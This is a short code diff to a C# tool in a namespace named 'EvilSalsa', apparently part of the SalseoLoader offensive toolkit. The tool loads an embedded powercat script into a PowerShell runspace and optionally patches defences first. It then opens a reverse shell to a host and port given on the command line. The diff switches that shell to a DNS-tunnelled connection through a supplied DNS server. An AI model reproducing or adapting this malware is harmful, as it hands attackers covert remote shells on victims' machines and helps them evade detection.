@@ -148,7 +148,7 @@ namespace EvilSalsa
             if (System.IO.File.Exists(checkdll) == true) { CyberVaca.Parchea(Salsa); }
             string reversa = args[0].ToString();
             string ip = (reversa.Split(' ')[0]);
-            string puerto = (reversa.Split(' ')[1]);
+            string DNSServer = (reversa.Split(' ')[1]);
             if (System.IO.File.Exists(checkdll) == true) { Console.WriteLine("[+] Enviando shell reversa pre-parcheada"); } else { Console.WriteLine("[+] Enviando shell reversa pre-parcheada"); }
             //--------------------- Funciones para cargar ------------------------------
             RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
@@ -159,7 +159,7 @@ namespace EvilSalsa
             //--------------------- Funciones para cargar ------------------------------
             pipeline.Commands.AddScript(SalseoLoader.powercat.powercatbase64());
             pipeline.Commands.AddScript(SalseoLoader.Load_Ps1.loadfileps1());
-            pipeline.Commands.AddScript("powercat -c " + ip + " -p " + puerto + " -ep");
+            pipeline.Commands.AddScript("powercat -c " + ip + " -dns " + DNSServer + " -ep --no-cache");
             pipeline.Invoke();
             return 0;
         }
